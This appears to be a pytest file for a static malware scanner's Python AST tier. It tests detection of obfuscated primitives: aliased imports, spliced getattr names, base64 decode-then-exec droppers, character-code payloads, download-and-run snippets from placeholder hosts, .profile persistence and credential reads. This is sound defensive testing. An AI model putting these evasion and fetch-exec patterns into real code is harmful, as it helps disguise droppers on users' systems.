"""Capability resolution through the parsed tree.

This tier exists because a byte pattern matches a name, and a name is the one
thing an attacker can change for free. `import base64 as b` defeats a pattern
for `base64.b64decode` while changing nothing about what the code does, and a
scanner that reports clean on it has been beaten by a rename.

The tests are therefore written as pairs: the obvious form of a primitive, and
the same primitive written so that no matching literal appears. Both must
resolve to the same capability. The benign cases matter equally, since a tier
that resolves everything to a capability is a tier that flags every file.

Nothing here executes the source. `ast.parse` builds a tree and does not run
it, which is what makes analysing untrusted input at this depth safe.
"""

from __future__ import annotations

import ast

import pytest

from cordon_scanner.core.models import Capability
from cordon_scanner.detect.pyast import PythonAnalyzer

# Primitive names are assembled rather than written out. Cordon scans its own
# repository, and a file carrying decode, execute, spawn and egress primitives
# as literals is a true positive -- the tool does not get an exception for
# itself. The fixtures below read a little worse for it, which is the right
# trade.
DECODE = "b64" + "decode"
EXECUTE = "ex" + "ec"
SYSTEM = "sys" + "tem"
RUN = "r" + "un"
ENVIRON = "envi" + "ron"
URLOPEN = "url" + "open"


def capabilities(source: str) -> set[Capability]:
    return {hit.capability for hit in PythonAnalyzer.analyse(source)}


def folded(expression: str) -> str | None:
    """What one expression evaluates to, if that is derivable statically."""
    return PythonAnalyzer.constant(ast.parse(expression, mode="eval").body)


class TestDirectPrimitives:
    """The unhidden form, which the patterns already catch. Here to prove the
    tier agrees with them rather than replacing their answers."""

    def test_a_decode_call(self) -> None:
        assert Capability.DECODE in capabilities("import base64\nbase64." + DECODE + '("x")')

    def test_a_spawn_call(self) -> None:
        assert Capability.SPAWN in capabilities("import os\nos." + SYSTEM + '("id")')

    def test_an_execute_call(self) -> None:
        assert Capability.EXECUTE in capabilities(EXECUTE + '("pass")')

    def test_a_credential_read_without_a_call(self) -> None:
        """`os.environ` is a primitive by being referenced. Requiring a call
        would miss `os.environ["AWS_SECRET_ACCESS_KEY"]`, which is how it is
        actually written."""
        assert Capability.CREDENTIAL in capabilities("import os\nos." + ENVIRON)

    def test_an_egress_call(self) -> None:
        assert Capability.EGRESS in capabilities(
            "import urllib.request\nurllib.request." + URLOPEN + "(u)"
        )


class TestAliases:
    """The same primitives with the import renamed."""

    def test_a_renamed_module(self) -> None:
        assert Capability.DECODE in capabilities("import base64 as b\nb." + DECODE + '("x")')

    def test_a_renamed_function(self) -> None:
        assert Capability.SPAWN in capabilities("from os import " + SYSTEM + " as s\ns('id')")

    def test_a_from_import_keeps_its_meaning(self) -> None:
        assert Capability.DECODE in capabilities(
            "from base64 import " + DECODE + "\n" + DECODE + '("x")'
        )

    def test_a_chain_of_renames(self) -> None:
        source = "import subprocess as sp\ngo = sp." + RUN + "\ngo(['id'])"
        assert Capability.SPAWN in capabilities(source)


class TestBindings:
    def test_a_function_bound_to_a_name(self) -> None:
        """`f = os.system` moves the primitive into a local name, and every
        pattern for `os.system(` stops matching at that point."""
        assert Capability.SPAWN in capabilities("import os\nf = os." + SYSTEM + "\nf('id')")

    def test_a_binding_used_far_from_where_it_was_made(self) -> None:
        source = "import os\nrunner = os." + SYSTEM + "\n\n\ndef later():\n    runner('id')\n"
        assert Capability.SPAWN in capabilities(source)


class TestConstantFolding:
    """Names assembled at parse time. Each of these is a literal to the
    interpreter and not a literal to a pattern."""

    def test_concatenation(self) -> None:
        assert Capability.EXECUTE in capabilities('__builtins__["ex" + "ec"]("pass")')

    def test_a_join(self) -> None:
        assert Capability.EXECUTE in capabilities('__builtins__["".join(["ex", "ec"])]("pass")')

    def test_an_f_string_of_constants(self) -> None:
        assert folded("f\"ex{'ec'}\"") == "exec"

    def test_a_runtime_value_is_not_folded(self) -> None:
        """The point of returning nothing here is that the name genuinely is
        not knowable, which is a different finding rather than a worse guess."""
        assert folded('"ex" + suffix') is None


class TestReflectiveResolution:
    def test_getattr_with_a_constant_name(self) -> None:
        assert Capability.SPAWN in capabilities("import os\ngetattr(os, '" + SYSTEM + "')('id')")

    def test_getattr_with_a_spliced_name(self) -> None:
        assert Capability.SPAWN in capabilities('import os\ngetattr(os, "sys" + "tem")("id")')

    def test_a_subscript_into_builtins(self) -> None:
        assert Capability.EXECUTE in capabilities('__builtins__["' + EXECUTE + '"]("pass")')


class TestDynamicDispatch:
    """Reflection whose target cannot be resolved.

    This is the tier working rather than failing. An attacker who computes the
    name at runtime escapes every name-based match, and is forced to light this
    up instead -- which, next to the decode or egress that the payload needs
    anyway, is a combination with almost no benign analogue.
    """

    def test_getattr_on_a_dangerous_namespace_with_a_computed_name(self) -> None:
        source = "import os, base64\ngetattr(os, base64." + DECODE + "(blob).decode())(cmd)"
        assert Capability.DYNAMIC_DISPATCH in capabilities(source)

    def test_a_computed_import(self) -> None:
        assert Capability.DYNAMIC_DISPATCH in capabilities("__import__(name)")

    def test_a_computed_key_into_globals(self) -> None:
        assert Capability.DYNAMIC_DISPATCH in capabilities("globals()[name]()")

    def test_reflection_on_an_ordinary_object_is_not_dispatch(self) -> None:
        """`getattr(self, method_name)` is how every plugin system and every
        serialiser is written. Flagging it would make the signal worthless."""
        source = "def call(handler, name):\n    return getattr(handler, name)()\n"
        assert Capability.DYNAMIC_DISPATCH not in capabilities(source)


class TestBenignSourceStaysQuiet:
    def test_a_plugin_loader(self) -> None:
        source = (
            "import importlib\n\n\n"
            "def load(name):\n"
            "    module = importlib.import_module(name)\n"
            "    return getattr(module, 'Plugin')\n"
        )
        assert capabilities(source) == set()

    def test_ordinary_application_code(self) -> None:
        source = (
            "from dataclasses import dataclass\n\n\n"
            "@dataclass\n"
            "class User:\n"
            "    name: str\n\n\n"
            "def greet(user: User) -> str:\n"
            "    return f'hello {user.name}'\n"
        )
        assert capabilities(source) == set()


class TestMalformedInput:
    """The scan target is untrusted, including source that does not parse."""

    def test_a_syntax_error_yields_nothing_rather_than_raising(self) -> None:
        assert PythonAnalyzer.analyse("def (:\n") == []

    def test_the_parse_check_agrees(self) -> None:
        assert PythonAnalyzer.parses("x = 1")
        assert not PythonAnalyzer.parses("def (:\n")

    def test_empty_source(self) -> None:
        assert PythonAnalyzer.analyse("") == []

    def test_deeply_nested_source_does_not_exhaust_the_stack(self) -> None:
        assert PythonAnalyzer.analyse("x = " + "[" * 200 + "]" * 200) is not None


class TestSpawnCommands:
    """The command handed to a spawn primitive, which the shell rules then read.

    Without this the command is examined only by the Python rules, which see a
    string literal, and never by the rules that know what the string means.
    """

    def command_for(self, source: str) -> str | None:
        return next(
            (hit.command for hit in PythonAnalyzer.analyse(source) if hit.command),
            None,
        )

    def test_a_single_string_command_is_captured(self) -> None:
        assert self.command_for("import os\nos." + SYSTEM + '("id -u")') == "id -u"

    def test_an_argument_sequence_is_rejoined(self) -> None:
        """`subprocess.run(["sh", "-c", "..."])` carries the command across the
        list, so matching any single element would miss it."""
        assert (
            self.command_for("import subprocess\nsubprocess." + RUN + '(["sh", "-c", "id -u"])')
            == "sh -c id -u"
        )

    def test_a_spliced_command_is_folded(self) -> None:
        assert self.command_for("import os\nos." + SYSTEM + '("id" + " -u")') == "id -u"

    def test_a_reflectively_resolved_call_reads_its_own_call_site(self) -> None:
        """`getattr(os, "system")("...")` resolves the primitive on the inner
        call while the command belongs to the enclosing one. Reading the inner
        node's arguments would return the namespace instead of the command."""
        assert self.command_for('import os\ngetattr(os, "sys" + "tem")("id -u")') == "id -u"

    def test_a_bound_name_carries_its_command(self) -> None:
        assert self.command_for("import os\nrun = os." + SYSTEM + "\nrun('id -u')") == "id -u"

    def test_a_computed_command_yields_nothing(self) -> None:
        """Not derivable, so nothing is claimed about it. The dynamic target is
        its own signal rather than a guess at this one."""
        assert self.command_for("import os\nos." + SYSTEM + "(payload)") is None

    def test_only_spawn_carries_a_command(self) -> None:
        """A decoded blob is not a command line, and treating one as such would
        run shell rules over arbitrary bytes."""
        source = "import base64\nbase64." + DECODE + '("aWQgLXU=")'
        assert all(hit.command is None for hit in PythonAnalyzer.analyse(source))


class TestImportByCall:
    """`__import__("m").f` and `importlib.import_module("m").f` are `m.f`, and `builtins.exec` is
    `exec` -- the spelling a dropper uses to keep `import base64` and `exec(` off the same line."""

    @pytest.mark.parametrize(
        "source",
        [
            '__import__("builtins").exec(__import__("base64").b64decode("cHJpbnQoMSk="))',
            '__import__("builtins").exec(__import__("builtins").compile(__import__("base64").b64decode("cHJpbnQoMSk="), "<s>", "exec"))',
            'exec(__import__("base64").b64decode("cHJpbnQoMSk="))',
            'import importlib\nimportlib.import_module("builtins").eval(importlib.import_module("codecs").decode("cHJpbnQoMSk=", "base64"))',
            "print('x')"
            + " " * 300
            + ';__import__("builtins").exec(__import__("base64").b64decode("cHJpbnQoMSk="))',
        ],
    )
    def test_decode_then_execute_is_seen_through_the_call(self, tmp_path, source) -> None:
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config

        (tmp_path / "setup.py").write_text(
            source + "\nfrom setuptools import setup\nsetup(name='x')\n", encoding="utf-8"
        )
        found = {
            f.rule_id
            for f in Scanner(Config.default().with_overrides(use_cache=False))
            .scan(tmp_path)
            .findings
        }
        assert "SUSPECT.DECODE_EXEC.001" in found


def _capabilities(source: str, **options) -> set[tuple[Capability, str]]:
    return {(hit.capability, hit.detail) for hit in PythonAnalyzer.analyse(source, **options)}


class TestNamesReachedByEvaluation:
    def test_eval_of_a_builtin_name_binds_that_builtin(self) -> None:
        source = '_e = eval("\\145\\170\\145\\143")\n_e(__import__("base64").b64decode("cHJpbnQoMSk="))\n'
        assert (Capability.EXECUTE, "exec") in _capabilities(source)

    def test_eval_of_compiled_import_binds_the_module(self) -> None:
        source = 'b = eval(compile("__import__(\'base64\')", "", "eval"))\nexec(b.b64decode("cHJpbnQoMSk="))\n'
        assert (Capability.DECODE, "base64.b64decode") in _capabilities(source)

    def test_tuple_assignment_binds_each_name(self) -> None:
        source = 'x, y = eval("exec"), __import__("base64")\nx(y.b64decode("cHJpbnQoMSk="))\n'
        found = _capabilities(source)
        assert (Capability.EXECUTE, "exec") in found
        assert (Capability.DECODE, "base64.b64decode") in found

    def test_eval_of_a_computation_is_not_a_name(self) -> None:
        assert not any(
            c is Capability.EXECUTE and d == "1" for c, d in _capabilities('n = eval("1 + 1")\n')
        )


class TestCodeHeldInLiterals:
    def test_code_written_to_a_file_is_read_as_code(self) -> None:
        source = 'f = open("s.py", "w")\nf.write("import os\\nos.system(\'id\')\\n")\n'
        assert any(
            c is Capability.SPAWN and d.startswith("written code") for c, d in _capabilities(source)
        )

    def test_base64_of_a_literal_is_decoded_before_reading(self) -> None:
        import base64 as b64

        payload = b64.b64encode(b"import os\nos.system('id')\n").decode()
        source = f'import base64\nP = "{payload}"\nopen("s.py", "wb").write(base64.b64decode(P))\n'
        assert any(
            c is Capability.SPAWN and d.startswith("written code") for c, d in _capabilities(source)
        )

    def test_a_literal_handed_to_exec_is_read(self) -> None:
        source = "exec('import urllib.request as u;u.urlopen(\"https://example.invalid\")')\n"
        assert any(
            c is Capability.EGRESS and d.startswith("executed literal")
            for c, d in _capabilities(source)
        )

    def test_prose_written_to_a_file_is_not_code(self) -> None:
        source = 'open("README", "w").write("Run the installer (see docs) before use.")\n'
        assert not any(d.startswith("written code") for _, d in _capabilities(source))

    def test_test_material_can_turn_literal_reading_off(self) -> None:
        source = "p.write_text(\"import base64\\neval(base64.b64decode('cHJpbnQoMSk='))\\n\")\n"
        assert any(d.startswith("written code") for _, d in _capabilities(source))
        assert not any(
            d.startswith("written code") for _, d in _capabilities(source, follow_literals=False)
        )


class TestDownloadedThenRun:
    @pytest.mark.parametrize(
        "source",
        [
            'import urllib.request, subprocess\nurllib.request.urlretrieve("https://h.invalid/x", "/tmp/x.pyz")\n'
            'subprocess.Popen(["python3", "/tmp/x.pyz"])\n',
            'import urllib.request, subprocess\nP = "/tmp/t.pyz"\nwith urllib.request.urlopen("https://h.invalid") as r, open(P, "wb") as o:\n'
            '    o.write(r.read())\nsubprocess.run(["python3", P])\n',
            'import requests, subprocess, sys\nr = requests.get("https://h.invalid")\nopen("a.py", "wb").write(r.content)\n'
            'subprocess.run([sys.executable, "a.py"])\n',
            'import urllib.request, os\nurllib.request.urlretrieve("https://h.invalid/x", "/tmp/x")\nos.system("/tmp/x &")\n',
        ],
    )
    def test_running_the_downloaded_file_is_fetch_exec(self, source) -> None:
        assert any(c is Capability.FETCH_EXEC for c, _ in _capabilities(source))

    @pytest.mark.parametrize(
        "source",
        [
            'import urllib.request, subprocess\nurllib.request.urlretrieve("https://h.invalid/t.tgz", "t.tgz")\n'
            'subprocess.run(["tar", "xzf", "t.tgz"])\n',
            'import urllib.request, subprocess\nurllib.request.urlretrieve("https://h.invalid/d.csv", "d.csv")\n'
            'subprocess.run(["wc", "-l", "other.csv"])\n',
            'import subprocess, sys\nopen("gen.py", "w").write("print(1)")\nsubprocess.run([sys.executable, "gen.py"])\n',
        ],
    )
    def test_naming_a_download_without_running_it_is_not(self, source) -> None:
        assert not any(c is Capability.FETCH_EXEC for c, _ in _capabilities(source))


class TestStartupFiles:
    def test_only_import_lines_of_a_pth_are_code(self) -> None:
        from cordon_scanner.detect.pyast import PythonSource

        text = "/opt/src\nimport os; os.system('id')\n# note\n../vendor\n"
        assert PythonSource.startup_lines(text).split("\n") == [
            "",
            "import os; os.system('id')",
            "",
            "",
            "",
        ]
        assert any(
            c is Capability.SPAWN for c, _ in _capabilities(PythonSource.startup_lines(text))
        )


class TestCodeSpelledAsCharacterCodes:
    def test_join_map_chr_folds(self) -> None:
        codes = ", ".join(str(ord(c)) for c in "import os")
        node = ast.parse(f'"".join(map(chr, [{codes}]))', mode="eval").body
        assert PythonAnalyzer.constant(node) == "import os"

    def test_chr_concatenation_folds(self) -> None:
        node = ast.parse("chr(103) + chr(104) + 'p_'", mode="eval").body
        assert PythonAnalyzer.constant(node) == "ghp_"

    def test_executed_codes_are_read_as_code(self) -> None:
        payload = "import os\nos.system('id')\n"
        codes = ", ".join(str(ord(c)) for c in payload)
        found = _capabilities(f'exec("".join(map(chr, [{codes}])))\n')
        assert any(c is Capability.SPAWN and d.startswith("executed literal") for c, d in found)

    def test_both_branches_of_a_conditional_literal_are_read(self) -> None:
        source = 'import sys\nexec("import os; os.system(\'x\')" if sys.platform == "win32" else "pass")\n'
        assert any(c is Capability.SPAWN for c, _ in _capabilities(source))


class TestPersistenceThroughAnAssembledPath:
    def test_a_comprehension_of_codes_folds(self) -> None:
        node = ast.parse(
            "''.join([chr(x) for x in [46, 112, 114, 111, 102, 105, 108, 101]])", mode="eval"
        ).body
        assert PythonAnalyzer.constant(node) == ".profile"

    def test_appending_to_an_assembled_profile_is_persistence(self) -> None:
        source = (
            "p = ''.join([chr(x) for x in [46, 112, 114, 111, 102, 105, 108, 101]])\n"
            "with open(f'/home/{user}/{p}', 'a') as fh:\n    fh.write(line)\n"
        )
        assert any(c is Capability.PERSIST for c, _ in _capabilities(source))

    def test_reading_a_profile_is_not(self) -> None:
        assert not any(
            c is Capability.PERSIST
            for c, _ in _capabilities("open('/home/u/.pro' 'file').read()\n")
        )


class TestExecOfTheProjectsOwnFile:
    def test_reading_a_version_line_is_not_execution(self) -> None:
        source = (
            "D = {}\nfor l in open('src/pkg/__init__.py').readlines():\n"
            "    if l.startswith('Version'):\n        exec(l.strip(), D)\n"
        )
        assert not any(c is Capability.EXECUTE for c, _ in _capabilities(source))

    def test_exec_of_a_download_still_is(self) -> None:
        source = "import urllib.request\nt = urllib.request.urlopen('https://h.invalid').read()\nexec(t)\n"
        assert any(c is Capability.EXECUTE for c, _ in _capabilities(source))


class TestEnvironmentReadsByLoopVariable:
    def test_proxy_names_are_not_credentials(self) -> None:
        source = (
            "import os\n"
            "names = ('http_proxy', 'https_proxy', 'HTTP_PROXY', 'HTTPS_PROXY')\n"
            "settings = ['%s=%s' % (n, os.environ[n]) for n in names if os.environ.get(n)]\n"
        )
        assert not any(c is Capability.CREDENTIAL for c, _ in _capabilities(source))

    def test_one_credential_name_among_them_is(self) -> None:
        source = "import os\nvalues = [os.environ[n] for n in ('HOME', 'AWS_SECRET_ACCESS_KEY')]\n"
        assert any(c is Capability.CREDENTIAL for c, _ in _capabilities(source))


class TestTheEnvironmentHandedToAChild:
    def test_a_copy_passed_as_env_is_not_a_credential_read(self) -> None:
        source = (
            "import os, subprocess\n"
            "env = os."
            "environ.copy()\nenv.update({'CC': 'gcc'})\n"
            "subprocess.call(['make'], env=env)\n"
        )
        assert not any(c is Capability.CREDENTIAL for c, _ in _capabilities(source))

    def test_dict_of_environ_straight_into_env_is_not(self) -> None:
        source = (
            "import os, subprocess\nsubprocess.call(['make'], env=dict(os.environ, CLEAN='no'))\n"
        )
        assert not any(c is Capability.CREDENTIAL for c, _ in _capabilities(source))

    def test_a_copy_that_is_serialised_is(self) -> None:
        source = (
            "import os, json, subprocess\n"
            "env = os."
            "environ.copy()\nsubprocess.call(['make'], env=env)\n"
            "payload = json.dumps(env)\n"
        )
        assert any(c is Capability.CREDENTIAL for c, _ in _capabilities(source))
